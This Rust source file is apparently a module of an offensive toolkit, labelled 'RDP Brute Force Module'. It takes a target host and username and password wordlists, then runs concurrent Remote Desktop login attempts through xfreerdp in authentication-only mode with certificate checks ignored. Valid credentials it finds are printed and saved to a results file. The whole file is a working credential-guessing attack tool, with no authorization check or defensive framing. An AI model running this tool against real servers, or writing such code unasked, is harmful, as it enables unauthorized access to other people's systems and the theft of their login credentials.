use anyhow::Result;
use colored::*;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    sync::Arc,
};
use tokio::{
    process::Command,
    sync::{Mutex, Semaphore},
    time::{sleep, Duration},
};

pub async fn run(target: &str) -> Result<()> {
    println!("=== RDP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("RDP Port", "3389")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Please enter a number."),
        }
    };

    let usernames_file_path = prompt_required("Username wordlist path")?;
    let passwords_file_path = prompt_required("Password wordlist path")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Must be greater than 0."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file name", "rdp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false)?;

    let addr = format_socket_address(target, port);
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file_path)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }

    let passwords = load_lines(&passwords_file_path)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut handles = vec![];
    let mut user_cycle_idx = 0;

    'password_loop: for pass in passwords {
        if *stop_signal.lock().await {
            break 'password_loop;
        }

        let current_users_for_this_pass = if combo_mode {
            users.clone()
        } else {
            let user_for_this_pass = users[user_cycle_idx % users.len()].clone();
            user_cycle_idx += 1;
            vec![user_for_this_pass]
        };

        for user in current_users_for_this_pass {
            if *stop_signal.lock().await {
                break 'password_loop; // Break outer loop if stopping
            }

            let permit = Arc::clone(&semaphore).acquire_owned().await?;
            
            let addr_clone = addr.clone();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_credentials_clone = Arc::clone(&found_credentials);
            let stop_signal_clone = Arc::clone(&stop_signal);
            
            let handle = tokio::spawn(async move {
                let _permit_guard = permit; // Permit dropped when task finishes

                if *stop_signal_clone.lock().await {
                    return;
                }

                match try_rdp_login(&addr_clone, &user_clone, &pass_clone).await {
                    Ok(true) => {
                        println!("[+] SUCCESS: {} -> {}:{}", addr_clone, user_clone, pass_clone);
                        let mut found = found_credentials_clone.lock().await;
                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                        if stop_on_success {
                            *stop_signal_clone.lock().await = true;
                        }
                    }
                    Ok(false) => {
                        log(verbose, &format!("[-] ATTEMPT: {} -> {}:{}", addr_clone, user_clone, pass_clone));
                    }
                    Err(e) => {
                        log(verbose, &format!("[!] ERROR for {}:{}/{}: {}", addr_clone, user_clone, pass_clone, e));
                    }
                }
                sleep(Duration::from_millis(10)).await;
            });
            handles.push(handle);
        }
    }

    for handle in handles {
        handle.await?; // Propagate JoinErrors if any task panicked
    }

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials found:");
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            match File::create(&filename) {
                Ok(mut file) => {
                    for (host_addr, user, pass) in creds.iter() {
                        if writeln!(file, "{} -> {}:{}", host_addr, user, pass).is_err() {
                            eprintln!("[!] Error writing to result file: {}", filename.display());
                            break;
                        }
                    }
                    println!("[+] Results saved to '{}'", filename.display());
                }
                Err(e) => {
                    eprintln!("[!] Could not create output file '{}': {}", filename.display(), e);
                }
            }
        }
    }

    Ok(())
}

async fn try_rdp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    let mut child = Command::new("xfreerdp")
        .arg(format!("/v:{}", addr))
        .arg(format!("/u:{}", user))
        .arg(format!("/p:{}", pass))
        .arg("/cert:ignore")
        .arg("/timeout:5000") 
        .arg("+auth-only") // Attempt authentication without full desktop session
        .arg("/log-level:OFF")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null()) // Suppress stderr as well for cleaner output unless specific errors are parsed
        .spawn()?;

    let status = child.wait().await?;
    Ok(status.success())
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required. Please provide a value.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default_val: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default_val).cyan().bold());
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default_val.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let options = if default_yes { "(Y/n)" } else { "(y/N)" };
    loop {
        print!("{}", format!("{} {} : ", msg, options).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y', 'yes', 'n', or 'no'.".yellow());
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow::anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path = Path::new(input_path_str);
    let filename_component = path
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .unwrap_or_else(|| std::borrow::Cow::Borrowed(input_path_str)); // Fallback to input if no filename part

    let final_name = if filename_component.is_empty()
        || filename_component == "."
        || filename_component == ".."
        || filename_component.contains('/') // Ensure it's not a path segment
        || filename_component.contains('\\')
    {
        "rdp_brute_results.txt" // A robust default filename
    } else {
        filename_component.as_ref()
    };

    PathBuf::from(format!("./{}", final_name))
}

fn format_socket_address(ip: &str, port: u16) -> String {
    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") { // Basic IPv6 check, avoid re-bracketing if port already there
        format!("[{}]:{}", trimmed_ip, port)
    } else {
        format!("{}:{}", trimmed_ip, port)
    }
}
